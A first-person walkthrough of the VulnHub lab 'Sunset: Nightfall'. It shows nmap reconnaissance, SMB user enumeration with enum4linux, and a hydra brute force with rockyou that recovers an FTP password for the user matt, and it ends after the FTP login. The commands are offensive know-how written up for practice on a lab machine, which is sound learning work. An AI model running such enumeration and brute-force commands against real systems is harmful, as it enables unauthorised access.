# Sunset: Nightfall

https://www.vulnhub.com/entry/sunset-nightfall,355/

## Initial Reconnaissance

After using `netdiscover` to find the machine, a `nmap -T4 -A -p-` returned:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         pyftpdlib 1.5.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.1.106:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9:25:e1:4f:41:c6:0f:be:31:21:7b:27:e3:af:49:a9 (RSA)
|   256 38:15:c9:72:9b:e0:24:68:7b:24:4b:ae:40:46:43:16 (ECDSA)
|_  256 9b:50:3b:2c:48:93:e1:a6:9d:b4:99:ec:60:fb:b6:46 (ED25519)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
```

nikto and dirb on the website returned nothing. the ftp server did not permit anonymous access, the smb shares had no directories set, ssh with nightfall as a user did not have an empty password (which was extremely unlikely). The mysql database was also secured.

I went through all the versions I could see, checking for vulns, and found nothing. Pretty stuck at this point, this being a wall harder than any I had faced so far.

## Getting a hint

I browsed for a hint, and found people discovering users using nmapAutomator and specifically enum4linux over the smb endpoint. I had actually seen that when I ran automator myself, that it came up with two users: nightfall, and matt:

`enum4linux -a 192.168.1.106`:

```
... snipped ...
 ======================================================================== 
|    Users on 192.168.1.106 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1679783218-3562266554-4049818721
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\nightfall (Local User)
S-1-22-1-1001 Unix User\matt (Local User)
... snipped ...
```

So far, I haven't had to brute force any remote users, though I have obviously used rockyou in offline attacks. So, with the above accounts, I need to do a remote brute force against either the ftp or ssh accounts (I assume).

## Bruteforce and FTP

I used hydra and rockyou against the ftp with nightfall, but it didn't get anywhere. Doing the same with matt however finished almost immediately:

`hydra -l matt -P rockyou.txt ftp://192.168.1.106`:

```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-15 18:27:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://192.168.1.106:21/
[21][ftp] host: 192.168.1.106   login: matt   password: cheese
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-15 18:27:38
```

I logged into FTP via the above credentials, and it appeared to be matt's home folder. However almost nothing in it was accessible to me.
